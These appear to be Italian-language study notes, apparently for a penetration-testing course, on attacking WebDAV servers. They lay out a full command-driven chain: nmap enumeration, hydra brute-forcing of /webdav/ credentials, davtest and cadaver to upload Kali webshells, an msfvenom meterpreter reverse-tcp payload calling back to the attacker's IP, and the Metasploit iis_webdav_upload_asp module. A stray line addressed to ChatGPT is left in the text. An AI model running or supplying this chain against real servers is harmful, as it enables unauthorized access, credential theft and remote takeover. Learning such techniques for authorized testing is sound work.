il primo passo  è quello di verificare che WebDAV sia in esecuzione sul sistema target. Dopo aver confermato la sua esecuzione e la versione, possiamo procedere con un brute force delle credenziali anche se a volte non è configurato con le credenziali. 
i tool utilizzati sono davtest, per autenticare ed exploitare, e cadaver per poter caricare e scaricare file. 
come prima cosa eseguiamo una scansione con nmap usando gli script di default (`-sC`) e quelli per identificare le versioni (`-sV`) per poi scansionare la porta 80 (`-p80`) insieme allo script http-enum per avere più dettagli 

dopo aver ottenuto abbastanza informazioni, possiamo aprire il browser e inserire l’indirizzo IP nella barra degli url seguito dalla `/webdav`directory. 
come abbiamo detto prima, molto probabilmente ci verrá richiesto di inserire delle credenziali che troveremo utilizzando hydra:
`hydra -L <usernameFilePath> -P <passwordFilePath> <IP> http-get /webdav/` 
 come file per le credenziali possiamo usare quelli al path `/usr/share/wordlist/metasploit/common_user.txt e common_password.txt`
per quanto riguarda gli attacchi di bruteforce si deve stare attenti perché potrebbe causare un down del servizio dato che manda molte richieste in poco tempo. 
dopo aver ottenuto accesso al web server tramite webdav, dato che webdav permette di caricare e scaricare file all’interno del server terget, possiamo verificare questa caratteristica usando davtest con il comando 
`davtest -auth <username>:<password> -url http://IP/webdav/`
che uploaderà vari tipi (.txt .jsp.aspx .asp .pl .jhtml .cgi .cfm .html .shtml . php) di file e creerà delle cartelle nel target 

`cadaver http://<IP>`
e successivamente inserendo le credenziali richieste
per ottenere una shell con cui interagire con il web server e caricare delle web shells gia presenti su Kali linux al path `/usr/share/webshells/`
e possiamo inserire una web shell,  in base all’estensione di file che ha ottenuto successo usando WebDAV, con il comando dentro la sessione di cadaver: 
`put </usr/share/webshells/webShellDaUsare>`
per poi andare a ricaricare la pagina sul browser e eseguire la webshell caricata che sará formata da una casella di testo e del testo mostrato. 






(chatgot esegui una transazione di argomento per passare alla fase di exploit con metasploit)
possiamo generare degli script usando msfvenom che è un tool di metasploit che consente di generare dei payload per fornire una reverse shell o remote shell sul sistema target. 
`msfvenom -p <path> LHOST=<kaliIP> LPORT=<portaKali> -f asp > <payloadName.asp>`
`-p` indica il payload da utilizzare
nel path del payload possiamo inserire `windows/meterpeter/reverse_tcp`
`-f `indica il formato di file
se non siamo sicuri dell’architettura del sistema target, conviene generare un payload basato su 32 bit. 
dopo aver creato il payload, esso verrà messo nella directory corrente al nome specificato. 

successivamente, otteniamo una sessione con cadaver e inseriamo la shell con il comando put e possiamo eseguirla andando nel browser al url della macchina target/webdav e cliccando sul nome della shell precedentemente indicato, oppure possiamo usare metasploit framework con il modulo
multi/handler e successivamente, con set payload `windows/meterpeter/reverse_tcp` possiamo inserire lo stesso payload generato prima. 
al momento dell’esecuzione dobbiamo andare nel browser per poter avviare la reverse shell per successivamente avere una sessione meterpeter aperta sulla macchina, piú facile e diretta da usare. 

è possibile automatizzare l’intero processo usando il modulo 
`exploit/windows/iis/iis_webdav_upload_asp`
e impostando lo username, la password e il path di destinazione del codice .asp,  possiamo aprire la sessione meterpeter sulla macchina target senza dover andare sul browser per avviare la sessione. 
una cosa interessante di questo modulo è che elimina automaticamente il file della shell dalla macchina target dopo la sua esecuzione. 
